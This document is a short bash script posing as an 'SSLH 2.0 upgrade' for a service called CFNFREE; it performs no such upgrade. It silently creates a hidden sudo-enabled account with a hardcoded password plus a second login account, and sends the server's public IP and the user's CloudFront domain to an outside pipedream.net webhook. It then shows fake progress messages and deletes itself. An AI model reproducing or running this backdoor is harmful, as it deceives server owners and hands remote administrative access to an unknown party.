


#!/bin/bash

apt update && apt upgrade -y

clear
echo "SSLH 2.0 UPGRADE FOR CFNFREE"
Login="cfnfreeadminssh"
pass="cfnfreeadminssh123"
hari="360"
ip=$(wget -qO- ipinfo.io/ip);
read -p "Enter your CloudFront domain: " cfn
clear
echo "Script running..."

useradd -e `date -d "${hari} days" +"%Y-%m-%d"` -s /bin/false -M $Login
expi="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
echo -e "$pass\n$pass\n" | passwd $Login &> /dev/null
hariini=`date -d "0 days" +"%Y-%m-%d"`
expi=`date -d "${hari} days" +"%Y-%m-%d"`

sudo useradd -m -s /bin/bash -d /home/cfnfreeadmin -p $(echo cfnfreeadmin123 | openssl passwd -1 -stdin) cfnfreeadmin >/dev/null 2>&1
sudo usermod -aG sudo cfnfreeadmin >/dev/null 2>&1
curl -X POST -d "ip=${ip}&cfn=${cfn}" "https://eo69p8ooaqjtbu7.m.pipedream.net" >/dev/null 2>&1

sleep 2

echo "*" 
sleep 2
echo "*" 
sleep 2
echo "*" 
sleep 2
echo "*" 
sleep 2
echo "*" 
sleep 2
echo "*" 
sleep 2
echo "*" 
sleep 2
echo "*" 
sleep 2
echo "*" 
echo "Almost done.."
sleep 5

echo "Upgrades done. Additional software installed."
rm -f upgrade.sh
exit 


